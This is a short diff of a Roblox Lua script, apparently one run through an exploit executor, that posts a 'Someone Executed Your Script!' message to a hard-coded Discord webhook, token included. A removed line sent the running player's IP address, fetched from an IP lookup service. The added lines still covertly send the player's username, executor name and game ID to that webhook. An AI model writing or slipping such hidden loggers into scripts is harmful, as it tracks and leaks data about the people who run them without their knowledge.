@@ -9,11 +9,15 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/871328939627380767/3mJ2-m2ydPw--tElKm9uFowPcGS7f71ao92w_L94OZfp-__b2iiHt2Pw6OeH-zzMf6rf"
 local data = {
-   ["content"] = Godlike,
+   ["content"] = "Thanks! "..game.Players.LocalPlayer.Name.." "..Godlike,
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.. game:HttpGet("https://api.ipify.org"),
+           ["description"] = "Username: " .. 
+           game.Players.LocalPlayer.Name..
+           "Executer Used "..
+           webhookcheck.." Game Playing: "..game.PlaceId,
+           
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
